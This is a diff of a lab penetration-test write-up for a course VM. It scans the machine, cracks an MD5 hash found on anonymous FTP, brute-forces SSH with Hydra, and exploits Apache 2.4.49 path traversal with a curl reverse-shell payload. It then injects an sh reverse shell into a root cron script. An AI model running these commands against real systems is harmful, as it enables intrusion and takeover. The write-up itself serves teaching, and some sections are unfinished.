@@ -2,103 +2,157 @@
 As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap
 ```sh
 ┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sV -A 192.168.1.0/24
+└─$ sudo nmap -sV -O -A 192.168.1.0/24
 ```
 Even by trying to locate the machine itself by checking our ARP table, as its directly connected to us:
 ```sh
 ┌──(kali㉿kali)-[~]
-└─$ arp -a
+└─$ arp 
 ```
 Which is very odd, as the machine should have obtained an ip address from the DHCP service...
 
-However, after a while, we figured out that the machine *does* in fact have an ip assigned to it: by booting the machine in recovery mode and enabling the `root` console selecting the root console, we in fact found out that in `/etc/netplan` there is a static ip address *without* DHCP, which goes against the requirements of the assignment.
+However, after a while, we figured out that the machine *does* in fact have an ip assigned to it: by booting the machine in recovery mode and enabling the `root` console, we in fact found out that in `/etc/netplan` the machine is set up with a static ip `10.0.2.15`, so *without* DHCP, which goes against the requirements of the assignment.
 ![](images/netplan_trouble.png)
-Once `root`, we have removed every file under `/etc/netplan` and then we've created a new file `/etc/rc.local` file with following content
+What we did after is removing every file under `/etc/netplan` and then creating a new file `/etc/rc.local` to enable DHCP with following content
 ```sh
 #!/bin/bash
 dhclient
 exit 0
 ```
-then `chmod 755 /etc/rc.local` and then, enable and restart the service (may take a while), finally execute:
+To which we gave `rwx` permissions to root and `r-x` to everyone else
+```sh
+chmod 755 /etc/rc.local
+``` 
+Finally, we enabled and restarted the service to save the configuration (may take a while):
 ```sh
 systemctl enable rc-local
 systemctl restart rc-local
 ```
 We did **not** tamper with the machine in any other way while in recovery mode, we just needed to perform the above to actually begin with the assignment.
 
-# Information Gathering
-We've started from a very quick and clean `nmap`, which revealed the following output:
+# Scanning and enumeration
+We've started from a very quick `nmap` which revealed the following output:
 
 ```sh
 ┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sV -A 192.168.56.2
+└─$ sudo nmap -sV -A -O 192.168.56.2
+
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 03:40 EDT
 Nmap scan report for 192.168.56.2
-Host is up (0.00087s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.5
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 ftp      ftp           216 Apr 30 12:08 site-credentials.txt
-| ftp-syst:
-|   STAT:
+Host is up (0.00035s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
 | FTP server status:
-|      Connected to ::ffff:192.168.56.3
+|      Connected to ::ffff:192.168.1.180
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
-|      At session startup, client count was 2
+|      At session startup, client count was 1
 |      vsFTPd 3.0.5 - secure, fast, stable
 |_End of status
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp           216 Apr 30 12:08 site-credentials.txt
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
 |   3072 59:dc:bf:b0:43:be:b5:ed:c4:1f:b8:0b:93:01:3a:4a (RSA)
 |   256 2d:12:5e:5d:a5:11:18:ec:16:07:b6:ce:ae:7f:14:03 (ECDSA)
 |_  256 b8:76:62:9f:68:28:a8:30:d0:87:13:fd:d1:10:aa:df (ED25519)
-MAC Address: 08:00:27:61:9A:82 (Oracle VirtualBox virtual NIC)
+8080/tcp open  http    Apache httpd 2.4.49 ((Unix))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.49 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+MAC Address: 08:00:27:DF:A3:D9 (Oracle VirtualBox virtual NIC)
 Device type: general purpose
 Running: Linux 4.X|5.X
-```
-As we can see there is not much available:
-- an FTP with anonymous login enabled 
-- an SSH service  
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-## FTP
-Since nMap shows us an anonymous login allowed on machine, try to explore..
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.35 ms 192.168.56.2
+```
+As we can see there are a few open services
+- **FTP** on port 21 (with anonymous login available!)
+- **SSH** on port 22 
+- **Apache** on port 8080 (a webserver)
+
+# Foothold
+Let's try establishing foothold by leveraging each path individually. We have color coded them to what we thought the paths were like
+
+## 🟢 via FTP
+As we have already said, above FTP allows for anonymous login, so let's do that:
 ```sh
 ┌──(kali㉿kali)-[~]
 └─$ ftp 192.168.56.2
-    anonymous
-    <blank_password>
+
+Connected to 192.168.56.2.
+220 (vsFTPd 3.0.5)
+Name (192.168.56.2:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+By executing a quick `ls`, we can notice the presence of a file named `site-credentials.txt`, which we will download 
+```sh 
+ftp> get site-credentials.txt
 ```
 ![](images/ftp_login.png)
-`site-credentials.txt` reports something like
+
+The file, which landed on `/home/kali`, reports the following:
+
 ```txt
-In case you forget the credentials to upload the files on the website,the IT department provided me with a file containing the password.
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat site-credentials.txt 
+
+In case you forget the credentials to upload the files on the website,the IT department provided me with a file containing the password. 
 They mentioned a certain MD5 code.
 
 ftp-user 37b4e2d82900d5e94b8da524fbeb33c0
 ```
-seems we have a password hashed with MD5, but.. MD5 is unsafe since 2008 then maybe a rainbow-table attack can "decode" it.
+
+Very conveniently, there is password hashed for `ftp-user` with MD5, which is a very unsafe hash function to employ in cryptographic appliances.
+
+We can use our trusty `JohnTheRipper` to crack the hash (which we will put inside `crack.txt` file) using the `rockyou` wordlist:
 
 ```sh
-md5:37b4e2d82900d5e94b8da524fbeb33c0 -> football
+┌──(kali㉿kali)-[~]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 
+
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football         (?)     
+1g 0:00:00:00 DONE (2024-05-31 17:30) 50.00g/s 9600p/s 9600c/s 9600C/s 123456..november
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.  
 ```
-then.. could be this a user of the system? try it.
+Could `ftp-user` be an SSH user of the target machine? Let's try it:
 ```sh
 ┌─(kali㉿kali)-[~]
 └─$ ssh ftp-user@192.168.56.2
     football
+
 ftp-user@ubuntulab:~$
 ```
-**An unpriviledged shell was obtained 🏴‍☠️**
-
-## Mounted disks
+An unpriviledged shell was obtained: despite being such, we have access to juicy information, such as the mounted disks 
 ```sh
 ftp-user@ubuntulab:~$ lsblk
+
 NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
 loop0    7:0    0 49.9M  1 loop /snap/snapd/18357
 loop1    7:1    0 91.9M  1 loop /snap/lxd/24061
@@ -111,7 +165,7 @@ sda      8:0    0  5.2G  0 disk
 └─sda4   8:4    0  4.2G  0 part /
 sr0     11:0    1 1024M  0 rom
 ```
-## /etc/passwd
+and how could we miss the `/etc/passwd` file:
 ```sh
 ...
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
@@ -120,11 +174,42 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
 ```
+Where we can notice the presence of another user `ubuntu`.
 
-# Play with users
-## ftp-user
-### Information gathering
-Try to understand what are last operation of ftp-user by reading his **.bash_history** file
+## 🟠 via SSH 
+Since SSH is enabled, we tried to enumerate SSH users and guess their passwords. To find the SSH username `ubuntu` we have used `-L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` and for password the command below
+ ```sh
+ ┌──(kali㉿kali)-[~/Desktop]
+└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.4 ssh
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 12:49:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
+[DATA] attacking ssh://192.168.56.4:22/
+[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-09 12:50:20
+```
+```sh
+[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
+```
+
+## 🔴 via Apache
+With that version of Apache (2.4.49) misconfigured, we are able to produce a remote code execution via Path Traversal.
+ ```sh
+ curl -s -X POST -d "echo; bash -i >& /dev/tcp/192.168.56.3/9321 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
+ ```
+
+# Privilege escalation
+Now that we've found three different ways to get access to the machine, we will show the paths we found to escalate ourselves to the almighty `root` user.
+
+We first notice the presence of the `.bash_history` file, let's take a peek:
 ```sh
 ftp-user@ubuntulab:~$ cat .bash_history
 ls
@@ -146,47 +231,89 @@ nano ../scripts/health_check.sh
 vi ../scripts/health_check.sh
 less ../scripts/health_check.sh
 ```
-in his `/home` there are some files, maybe useful for priviledge escalation
+in his `/home` there are some files, maybe useful for privilege escalation later on... we'll see.
 ```sh
 ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
 printenv  printenv.vbs	printenv.wsf  test-cgi
 ```
 
-# Privilege escalation
-## Cronjob health-check.sh
-The crontab was set to execute the health-check.sh every minute (`*/1 * * * *`)
- as root. Since health-check.sh was writable by the `ftp-user` we were able to inject a reverse shell into it:
- ```sh
- sh -i >& /dev/tcp/<attacker_machine>/<attacker_port> 0>&1
-``` 
-
- # Foothold
- ## via Apache
-With that version of Apache (2.4.49) misconfigured, we are able to produce a remote code execution via Path Traversal.
- ```sh
- curl -s -X POST -d "echo; bash -i >& /dev/tcp/192.168.56.3/9321 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
- ```
- ## via SSH 
-Since SSH is enabled, we could try to enumerate SSH users and guess their passwords.
-To find username `ubuntu` we have used `-L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` and for password the command below
- ```sh
- ┌──(kali㉿kali)-[~/Desktop]
-└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.4 ssh
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 12:49:56
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
-[DATA] attacking ssh://192.168.56.4:22/
-[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
-1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 1 final worker threads did not complete until end.
-[ERROR] 1 target did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-09 12:50:20
-```
+## 🟢 via Cronjob 
+By checking the `crontab` file, we noticed a particular:
 ```sh
-[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
-```
+ftp-user@ubuntulab:/home/ubuntu$ cat /etc/crontab
 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+v
+# Health Check Apache Server
+*/1 * * * * root /usr/local/apache24/scripts/health_check.sh
+```
+Last line: it was set to execute the `health-check.sh` script every minute (`*/1 * * * *`) as `root`, but not only... the script in question is writeable by our current `ftp-user`
+
+```sh
+ftp-user@ubuntulab:/home/ubuntu$ ls -la /usr/local/apache24/scripts/health_check.sh 
+
+-rwxrw-rw- 1 root ftp-user 415 Apr 30 14:07 /usr/local/apache24/scripts/health_check.sh
+```
+This is a clear vulnerability that we can leverage to obtain privilege escalation: it was enough to inject a reverse shell onto the file, in this case by LotL - Living off the Land technique using `sh`:
+
+ ```sh
+ftp-user@ubuntulab:/home/ubuntu$ echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache24/scripts/health_check.sh
+``` 
+Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener
+```sh
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 7777
+```
+Since the file is executed as root, the shell will be a root shell.
+
+## 🟠 via SSH
+When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.
+
+Well, turns out that the aforementioned user has full root privileges.
+
+```sh
+ubuntu@ubuntulab:~$ sudo -l
+
+Matching Defaults entries for ubuntu on ubuntulab:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ubuntu may run the following commands on ubuntulab:
+    (ALL : ALL) ALL
+```
+We can `sudo` everything or actually become `root` user by doing `sudo su`, using the same password that we used for foothold (`admin@123`)
+```sh
+ubuntu@ubuntulab:~$ sudo su
+
+[sudo] password for ubuntu: 
+root@ubuntulab:/home/ubuntu#
+```
+We are aware that this is a rather trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
+
+## 🔴 via LXD
+(manca)
+
+# Conclusions
+The following image shows every possible way to exploit the machine we were given
+
+(immagine di SaL)
